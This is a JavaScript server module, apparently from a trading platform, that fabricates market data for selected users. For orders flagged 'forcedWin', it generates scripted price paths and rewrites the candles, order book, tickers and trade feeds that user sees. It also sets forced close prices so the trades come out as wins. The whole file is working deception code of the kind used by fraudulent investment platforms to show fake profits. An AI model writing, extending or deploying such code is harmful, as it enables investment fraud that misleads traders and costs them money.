import "server-only";
import { ObjectId } from "mongodb";
import { collections } from "@/lib/mongo";

const SECOND = 1000;
const MINUTE = 60 * SECOND;
const CACHE_TTL = 750;

const clamp01 = (value) => Math.min(1, Math.max(0, value));

const seedOf = (id) => {
  const hex = new ObjectId(id).toHexString().slice(-8);
  return parseInt(hex, 16) >>> 0;
};

const param = (seed, salt, min, max) => {
  const span = (seed >>> (salt * 4)) & 0xffff;
  return min + (span / 0xffff) * (max - min);
};

const orderSteer = (order, at) => {
  const seed = seedOf(order._id);
  const openedAt = order.openedAt.getTime();
  const expiresAt = order.expiresAt.getTime();
  const progress = clamp01((at - openedAt) / Math.max(1, expiresAt - openedAt));
  const total = param(seed, 1, 0.0005, 0.0035);
  const amp = param(seed, 2, 0.0002, 0.0012);
  const cycles = 2 + Math.floor(param(seed, 3, 0, 4));
  const phase = param(seed, 4, 0, Math.PI * 2);
  const wave = amp * Math.sin(2 * Math.PI * cycles * progress + phase) * (1 - progress);
  const drift = total * progress;
  const sign = order.direction === "put" ? -1 : 1;
  return order.openPrice * (1 + sign * (drift + wave));
};

const positionSteer = (position, at) => {
  const seed = seedOf(position._id);
  const openedAt = position.openedAt.getTime();
  const minutes = Math.max(0, (at - openedAt) / MINUTE);
  const span = param(seed, 1, 4, 12);
  const amp = param(seed, 2, 0.0002, 0.0012);
  const phase = param(seed, 4, 0, Math.PI * 2);
  const wave = amp * Math.sin(2 * Math.PI * minutes * 0.25 + phase);
  const long = position.side === "long";
  const sign = long ? 1 : -1;
  if (position.takeProfit) {
    const distance = Math.abs(position.takeProfit - position.entryPrice) / position.entryPrice;
    const drift = distance * clamp01(minutes / span);
    const wiggle = Math.min(wave, distance * (1 - clamp01(minutes / span)) * 0.5);
    return position.entryPrice * (1 + sign * (drift + wiggle));
  }
  const drift = param(seed, 3, 0.001, 0.004) * (minutes / 10);
  return position.entryPrice * (1 + sign * (drift + wave));
};

const steeredFor = (window, at) => (window.kind === "order" ? orderSteer(window, at) : positionSteer(window, at));

const windowsCache = new Map();

const readWindows = (userId) => {
  const cached = windowsCache.get(userId);
  if (cached && Date.now() - cached.at < CACHE_TTL) return cached.windows;
  const windows = queryWindows(userId).catch((error) => {
    windowsCache.delete(userId);
    throw error;
  });
  windowsCache.set(userId, { at: Date.now(), windows });
  return windows;
};

const queryWindows = async (userId) => {
  const [orders, positions] = await Promise.all([
    collections.orders().find({ userId, forcedWin: true, status: "open" }).toArray(),
    collections.positions().find({ userId, forcedWin: true, status: "open" }).toArray(),
  ]);
  const windows = [
    ...orders.map((order) => ({ kind: "order", _id: order._id, symbol: order.symbol, direction: order.direction, openPrice: order.openPrice, openedAt: order.openedAt, expiresAt: order.expiresAt })),
    ...positions.map((position) => ({ kind: "position", _id: position._id, symbol: position.symbol, side: position.side, entryPrice: position.entryPrice, takeProfit: position.takeProfit, openedAt: position.openedAt })),
  ].filter((window) => window.openedAt);
  return windows;
};

export const invalidateOverlay = (userId) => {
  windowsCache.delete(userId);
};

export const activeWindow = async (userId, symbol, at = Date.now()) => {
  const windows = await readWindows(userId);
  const active = windows.filter((window) => window.symbol === symbol && at >= window.openedAt.getTime() && (!window.expiresAt || at <= window.expiresAt.getTime() + SECOND));
  if (!active.length) return null;
  return active.reduce((latest, window) => (window.openedAt > latest.openedAt ? window : latest));
};

export const steeredPrice = async (userId, symbol, at = Date.now()) => {
  const window = await activeWindow(userId, symbol, at);
  if (!window) return null;
  return steeredFor(window, at);
};

export const forcedClosePrice = async (order) => steeredFor({ kind: "order", ...order }, order.expiresAt.getTime());

export const forcedExitPrice = async (position, at = Date.now()) => steeredFor({ kind: "position", ...position }, at);

const samplesFor = (window, startMs, endMs, count) => {
  const step = Math.max(1, (endMs - startMs) / count);
  return Array.from({ length: count + 1 }, (_, index) => steeredFor(window, Math.min(endMs, startMs + index * step)));
};

export const transformCandles = async (userId, symbol, candles, stepMs) => {
  const windows = (await readWindows(userId)).filter((window) => window.symbol === symbol);
  if (!windows.length || !candles.length) return candles;
  const window = windows.filter((item) => item.kind === "order" || item.takeProfit).reduce((latest, item) => (item.openedAt > latest.openedAt ? item : latest), windows[0]);
  const startMs = window.openedAt.getTime();
  const endMs = Math.min(Date.now(), window.expiresAt ? window.expiresAt.getTime() : Date.now());
  if (endMs <= startMs) return candles;
  return candles.map((candle) => {
    const openMs = candle.openTime;
    const closeMs = openMs + stepMs;
    if (closeMs <= startMs) return candle;
    if (openMs >= endMs) return candle;
    const from = Math.max(startMs, openMs);
    const to = Math.min(endMs, closeMs);
    const values = samplesFor(window, from, to, 12);
    const low = Math.min(...values);
    const high = Math.max(...values);
    return { ...candle, open: values[0], close: values.at(-1), low, high };
  });
};

export const transformDepth = async (userId, symbol, { bids, asks }) => {
  const at = Date.now();
  const steered = await steeredPrice(userId, symbol, at);
  const real = bids[0] && asks[0] ? (Number(bids[0][0]) + Number(asks[0][0])) / 2 : null;
  if (!steered || !real) return { bids, asks };
  const ratio = steered / real;
  const shift = (levels) => levels.map(([price, quantity]) => [String(Number(price) * ratio), quantity]);
  return { bids: shift(bids), asks: shift(asks) };
};

export const transformTicker = async (userId, ticker) => {
  const at = Date.now();
  const steered = await steeredPrice(userId, ticker.symbol, at);
  if (!steered) return ticker;
  const ratio = steered / (ticker.price || steered);
  return {
    ...ticker,
    price: steered,
    high: Math.max(ticker.high * ratio, steered),
    low: Math.min(ticker.low * ratio, steered),
  };
};

export const transformTickerItem = async (userId, item) => {
  const at = Date.now();
  const steered = await steeredPrice(userId, item.s, at);
  if (!steered) return item;
  const real = Number(item.c) || steered;
  const ratio = steered / real;
  return {
    ...item,
    c: String(steered),
    h: String(Math.max(Number(item.h) * ratio, steered)),
    l: String(Math.min(Number(item.l) * ratio, steered)),
  };
};

export const transformKlineEvent = async (userId, symbol, k, intervalSeconds) => {
  const candle = { openTime: k.t, open: +k.o, high: +k.h, low: +k.l, close: +k.c };
  const [steered] = await transformCandles(userId, symbol, [candle], intervalSeconds * SECOND);
  if (steered === candle) return k;
  return { ...k, o: String(steered.open), h: String(steered.high), l: String(steered.low), c: String(steered.close) };
};

export const transformAggTrade = async (userId, symbol, data) => {
  const steered = await steeredPrice(userId, symbol, Date.now());
  if (!steered) return data;
  return { ...data, p: String(steered) };
};

export const transformRecentTrades = async (userId, symbol, trades) => {
  const at = Date.now();
  const window = await activeWindow(userId, symbol, at);
  if (!window) return trades;
  const startMs = window.openedAt.getTime();
  const endMs = window.expiresAt ? window.expiresAt.getTime() : at;
  return trades.map((trade) => {
    if (trade.time < startMs || trade.time > endMs) return trade;
    const steered = steeredFor(window, trade.time);
    return { ...trade, price: steered };
  });
};
